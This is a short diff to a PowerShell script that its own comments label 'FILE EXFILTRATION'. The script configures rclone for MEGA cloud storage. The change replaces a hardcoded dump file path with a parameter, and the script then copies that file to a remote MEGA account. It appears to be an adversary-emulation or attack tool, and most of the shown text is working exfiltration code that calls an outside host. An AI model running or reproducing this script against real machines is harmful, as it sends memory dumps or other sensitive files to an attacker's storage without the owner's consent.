@@ -1,3 +1,7 @@
+param (
+    [string]$fact
+)
+
 $ErrorActionPreference = 'Stop'
 
 # === RCLONE CONFIGURATION FOR MEGA ===
@@ -21,7 +25,9 @@ try {
 }
 
 # === FILE EXFILTRATION IF REMOTE IS VALID ===
-$dump = "C:\Users\Public\rustive.dmp"
+$dump = $fact
+Write-Output "Received fact value: $dump"
+
 if ($remoteOK -and (Test-Path $dump)) {
     Write-Output "Dump file found: $dump. Starting exfiltration."
     .\rclone.exe --config "$env:APPDATA\rclone\rclone.conf" copy $dump myMegaRemote:test -v
